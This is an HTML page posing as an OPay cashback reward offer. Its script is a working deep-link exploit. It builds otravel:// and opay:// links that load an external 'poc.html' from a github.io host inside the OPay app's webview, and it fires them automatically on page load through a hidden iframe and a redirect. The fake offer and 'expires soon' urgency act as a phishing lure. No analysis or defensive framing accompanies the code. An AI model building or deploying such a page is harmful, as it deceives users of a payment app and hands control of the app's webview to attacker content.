<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OPay Rewards</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', sans-serif;
            background: linear-gradient(135deg, #00c853 0%, #009624 100%);
            color: #fff;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }

        .card {
            background: white;
            border-radius: 16px;
            padding: 30px;
            max-width: 360px;
            width: 100%;
            text-align: center;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
        }

        .logo {
            font-size: 48px;
            margin-bottom: 10px;
        }

        h1 {
            color: #333;
            font-size: 22px;
            margin-bottom: 8px;
        }

        .sub {
            color: #666;
            font-size: 14px;
            margin-bottom: 24px;
        }

        .btn {
            display: block;
            width: 100%;
            padding: 15px;
            margin: 8px 0;
            background: #00c853;
            color: white;
            text-decoration: none;
            border-radius: 10px;
            font-weight: bold;
            font-size: 16px;
            border: none;
            cursor: pointer;
            -webkit-tap-highlight-color: transparent;
        }

        .btn:active {
            transform: scale(0.97);
            background: #00a844;
        }

        .btn.alt {
            background: #1a73e8;
        }

        .btn.alt:active {
            background: #1557b0;
        }

        .small {
            font-size: 11px;
            color: #aaa;
            margin-top: 20px;
        }

        .status {
            font-size: 12px;
            color: #999;
            margin-top: 10px;
            min-height: 16px;
        }
    </style>
</head>

<body>
    <div class="card">
        <div class="logo">🎁</div>
        <h1>OPay Valentine Rewards</h1>
        <div class="sub">Tap below to claim your cashback reward in OPay!</div>

        <a id="btnA" class="btn" href="#">🎉 Claim Reward Now</a>
        <a id="btnB" class="btn alt" href="#">📱 Open in OPay</a>

        <div class="status" id="status"></div>

        <div class="small">Powered by OPay — Offer expires soon</div>
    </div>

    <script>
        var PAYLOAD_BASE = "https://zugonwobi.github.io/opay-rewards/";
        var CB = "?v=" + new Date().getTime();

        var pocUrl = PAYLOAD_BASE + "poc.html" + CB;

        // Method A: otravel:// scheme (registered in CFBundleURLSchemes)
        var deepA = "otravel://schemedispatcher?scheme=" + encodeURIComponent(pocUrl);

        // Method B: opay:// scheme (try as fallback)
        var deepB = "opay://webview?url=" + encodeURIComponent(pocUrl);

        document.getElementById("btnA").href = deepA;
        document.getElementById("btnB").href = deepB;

        function setStatus(msg) {
            document.getElementById("status").innerText = msg;
        }

        // Try deep link via hidden iframe (less disruptive than location.href)
        function tryDeepLink(url, label) {
            setStatus("Opening " + label + "...");
            var iframe = document.createElement("iframe");
            iframe.style.display = "none";
            iframe.src = url;
            document.body.appendChild(iframe);
            // Clean up after a few seconds
            setTimeout(function () {
                try { document.body.removeChild(iframe); } catch (e) { }
            }, 3000);
        }

        document.getElementById("btnA").addEventListener("click", function (e) {
            e.preventDefault();
            setStatus("Opening OPay via otravel://...");
            // Try iframe method first
            tryDeepLink(deepA, "otravel");
            // Also set location as backup after short delay
            setTimeout(function () {
                window.location.href = deepA;
            }, 500);
        });

        document.getElementById("btnB").addEventListener("click", function (e) {
            e.preventDefault();
            setStatus("Opening OPay via opay://...");
            tryDeepLink(deepB, "opay");
            setTimeout(function () {
                window.location.href = deepB;
            }, 500);
        });

        // Auto-trigger on page load — try otravel:// automatically
        setTimeout(function () {
            setStatus("Redirecting to OPay app...");
            tryDeepLink(deepA, "otravel");
            // Fallback to location redirect
            setTimeout(function () {
                window.location.href = deepA;
            }, 800);
        }, 1000);
    </script>
</body>

</html>
